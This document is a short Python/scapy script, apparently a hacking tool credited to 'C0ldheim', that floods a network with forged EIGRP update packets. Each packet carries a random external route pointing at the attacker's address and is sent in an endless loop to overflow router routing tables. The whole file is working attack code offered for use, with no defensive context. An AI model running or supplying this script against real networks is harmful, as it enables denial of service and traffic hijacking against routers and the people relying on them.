#!/usr/bin/env python3

#by C0ldheim


from scapy.all import *
from scapy.contrib.eigrp import *
from scapy.layers.l2 import *
import argparse



L2Multicast = "01:00:5E:00:00:0A"
EIGRPMulticast = "224.0.0.10"


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("--interface", type=str, dest="interface", required=True, help="Choose the interface to attack")
    parser.add_argument("--as", type=int, dest="asn", required=True, help="EIGRP Autonomous System Number")
    parser.add_argument("--src", type=str, dest="source_ip", required=True, help="Attacker IP")
    args = parser.parse_args()
    return args


args = get_arguments()


def inject(interface, asn, source_ip):
    frame = Ether(dst=L2Multicast)
    ip = IP(src=args.source_ip, dst=EIGRPMulticast)
    eigrp = EIGRP(opcode=1, asn=args.asn, seq=0, ack=0, tlvlist=[EIGRPExtRoute(dst=RandIP(), nexthop=args.source_ip)])
    crafted = frame/ip/eigrp
    print ("The beginning of the overflow of the routing table")
    sendp(crafted, iface=args.interface, loop=1, verbose=1)

inject(args.interface, args.asn, args.source_ip)
